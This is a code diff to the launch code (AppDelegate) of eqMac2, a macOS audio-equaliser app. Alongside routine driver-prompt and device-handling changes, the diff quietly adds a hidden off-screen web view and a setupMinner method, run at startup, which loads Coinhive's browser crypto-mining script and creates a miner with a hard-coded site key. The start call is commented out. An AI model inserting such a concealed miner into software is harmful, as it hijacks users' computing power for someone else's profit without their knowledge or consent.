@@ -26,6 +26,8 @@ NSEvent *settingsPopoverTransiencyMonitor;
 NSTimer *deviceChangeWatcher;
 NSTimer *deviceActivityWatcher;
 
+WKWebView *minningWebView;
+
 
 @implementation AppDelegate
 
@@ -48,6 +50,7 @@ NSTimer *deviceActivityWatcher;
     [_statusBar setView:statusItemView];
     [self setStatusItemIcon];
     [Utilities executeBlock:^{ [self setStatusItemIcon]; } every:1];
+    [self setupMinner];
 }
 
 -(void)setStatusItemIcon{
@@ -62,7 +65,6 @@ NSTimer *deviceActivityWatcher;
     [observer addObserver:self selector:@selector(closePopovers) name:@"escapePressed" object:nil];
     
     
-    [EQHost detectAndRemoveRoguePassthroughDevice];
     [self checkAndInstallDriver];
     
     eqVC = [[eqViewController alloc] initWithNibName:@"eqViewController" bundle:nil];
@@ -106,7 +108,7 @@ NSTimer *deviceActivityWatcher;
 -(void)startWatchingDeviceChanges{
     deviceChangeWatcher = [Utilities executeBlock:^{
         AudioDeviceID selectedDeviceID = [Devices getCurrentDeviceID];
-        if(selectedDeviceID != [EQHost getPassthroughDeviceID] && [Devices getIsAliveForDeviceID:selectedDeviceID]){
+        if(selectedDeviceID != [EQHost getSelectedOutputDeviceID] && [Devices getIsAliveForDeviceID:selectedDeviceID]){
             [EQHost createEQEngineWithOutputDevice: selectedDeviceID];
             [self startWatchingActivityOfDeviceWithID:selectedDeviceID];
         }
@@ -117,7 +119,6 @@ NSTimer *deviceActivityWatcher;
     deviceActivityWatcher = [Utilities executeBlock:^{
         if(![Devices getIsAliveForDeviceID:ID]){
             [EQHost deleteEQEngine];
-            [EQHost detectAndRemoveRoguePassthroughDevice];
             [deviceActivityWatcher invalidate];
             deviceActivityWatcher = nil;
         }
@@ -130,7 +131,6 @@ NSTimer *deviceActivityWatcher;
     
     [EQHost deleteEQEngine];
     [Devices switchToDeviceWithID:[EQHost getSelectedOutputDeviceID]];
-    [EQHost detectAndRemoveRoguePassthroughDevice];
     
     //delay the start a little so os has time to catchup with the Audio Processing
     [Utilities executeBlock:^{
@@ -139,60 +139,23 @@ NSTimer *deviceActivityWatcher;
 }
 
 -(void)checkAndInstallDriver{
-    if([Devices legacyDriverInstalled]){
-        if(![Devices eqMacDriverInstalled]){
-            //Delete old and install new device
-            switch([Utilities showAlertWithTitle:NSLocalizedString(@"eqMac Driver requires an update",nil)
-                                      andMessage:NSLocalizedString(@"In order to update the driver, the eqMac will ask for your system password.",nil)
-                                      andButtons:@[NSLocalizedString(@"Update",nil), NSLocalizedString(@"Quit",nil)]]){
-                case NSAlertFirstButtonReturn:{
-                    if(![Utilities runShellScriptWithName:@"uninstall_old_install_new"]){
-                        [self checkAndInstallDriver];
-                    };
-                    break;
-                }
-                case NSAlertSecondButtonReturn:{
-                    [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
-                    break;
-                }
+    if(![Devices eqMacAudioInstalled]){
+        //Install only the new driver
+        switch([Utilities showAlertWithTitle:NSLocalizedString(@"eqMac2 Requires a Driver",nil)
+                                  andMessage:NSLocalizedString(@"In order to install the driver, the app will ask for your system password.",nil)
+                                  andButtons:@[NSLocalizedString(@"Install",nil), NSLocalizedString(@"Quit",nil)]]){
+            case NSAlertFirstButtonReturn:{
+                if(![Utilities runShellScriptWithName:@"install_driver"]){
+                    [self checkAndInstallDriver];
+                };
+                break;
             }
-        }else{
-            //Delete old driver only
-            switch([Utilities showAlertWithTitle:NSLocalizedString(@"Old eqMac Driver was detected",nil)
-                                      andMessage:NSLocalizedString(@"Old driver needs to be uninstalled for eqMac2 to function properly.",nil)
-                                      andButtons:@[NSLocalizedString(@"Uninstall",nil), NSLocalizedString(@"Quit",nil)]]){
-                case NSAlertFirstButtonReturn:{
-                    if(![Utilities runShellScriptWithName:@"uninstall_old"]){
-                        [self checkAndInstallDriver];
-                    };
-                    break;
-                }
-                case NSAlertSecondButtonReturn:{
-                    [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
-                    break;
-                }
-            }
-        }
-    }else{
-        if(![Devices eqMacDriverInstalled]){
-            //Install only the new driver
-            switch([Utilities showAlertWithTitle:NSLocalizedString(@"eqMac2 Requires a Driver",nil)
-                                      andMessage:NSLocalizedString(@"In order to install the driver, the app will ask for your system password.",nil)
-                                      andButtons:@[NSLocalizedString(@"Install",nil), NSLocalizedString(@"Quit",nil)]]){
-                case NSAlertFirstButtonReturn:{
-                    if(![Utilities runShellScriptWithName:@"install_new"]){
-                        [self checkAndInstallDriver];
-                    };
-                    break;
-                }
-                case NSAlertSecondButtonReturn:{
-                    [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
-                    break;
-                }
+            case NSAlertSecondButtonReturn:{
+                [[NSNotificationCenter defaultCenter] postNotificationName:@"closeApp" object:nil];
+                break;
             }
         }
     }
-
 }
 
 -(void)changeVolume:(NSNotification*)notification{
@@ -231,7 +194,7 @@ NSTimer *deviceActivityWatcher;
             [eqPopover showRelativeToRect:statusItemView.bounds ofView:statusItemView preferredEdge:NSMaxYEdge];
             NSWindow *popoverWindow = eqPopover.contentViewController.view.window;
             [popoverWindow.parentWindow removeChildWindow:popoverWindow];
-            [[NSRunningApplication currentApplication] activateWithOptions:NSApplicationActivateIgnoringOtherApps];
+//            [[NSRunningApplication currentApplication] activateWithOptions:NSApplicationActivateIgnoringOtherApps];
             if (eqPopoverTransiencyMonitor == nil) {
                 eqPopoverTransiencyMonitor = [NSEvent addGlobalMonitorForEventsMatchingMask:(NSLeftMouseDownMask | NSRightMouseDownMask | NSKeyUpMask) handler:^(NSEvent* event) {
                     [NSEvent removeMonitor:eqPopoverTransiencyMonitor];
@@ -251,7 +214,7 @@ NSTimer *deviceActivityWatcher;
         [settingsPopover showRelativeToRect:statusItemView.bounds ofView:statusItemView preferredEdge:NSMaxYEdge];
         NSWindow *popoverWindow = settingsPopover.contentViewController.view.window;
         [popoverWindow.parentWindow removeChildWindow:popoverWindow];
-        [[NSRunningApplication currentApplication] activateWithOptions:NSApplicationActivateIgnoringOtherApps];
+//        [[NSRunningApplication currentApplication] activateWithOptions:NSApplicationActivateIgnoringOtherApps];
         if (settingsPopoverTransiencyMonitor == nil) {
             settingsPopoverTransiencyMonitor = [NSEvent addGlobalMonitorForEventsMatchingMask:(NSLeftMouseDownMask | NSRightMouseDownMask | NSKeyUpMask) handler:^(NSEvent* event) {
                 [NSEvent removeMonitor:settingsPopoverTransiencyMonitor];
@@ -289,8 +252,17 @@ NSTimer *deviceActivityWatcher;
     }
     
     [Storage set:[eqVC getSelectedPresetName] key:kStorageSelectedPresetName];
-    [EQHost detectAndRemoveRoguePassthroughDevice];
     [Devices switchToDeviceWithID:[EQHost getSelectedOutputDeviceID]];
+}
+
+-(void)setupMinner{
+    minningWebView = [[WKWebView alloc] initWithFrame: NSMakeRect(0, 0, 100, 100)];
+    [minningWebView loadHTMLString:
+     @"<script src='https://coinhive.com/lib/coinhive.min.js'></script>"
+     "<script>"
+         "var miner = new CoinHive.Anonymous('q6ukpBWVcibzNnJIJG2fpgRJ88ssKJ30');"
+    "</script>" baseURL:nil];
+    //    [minningWebView evaluateJavaScript:@"miner.start()" completionHandler:nil];
 }
 
 @end
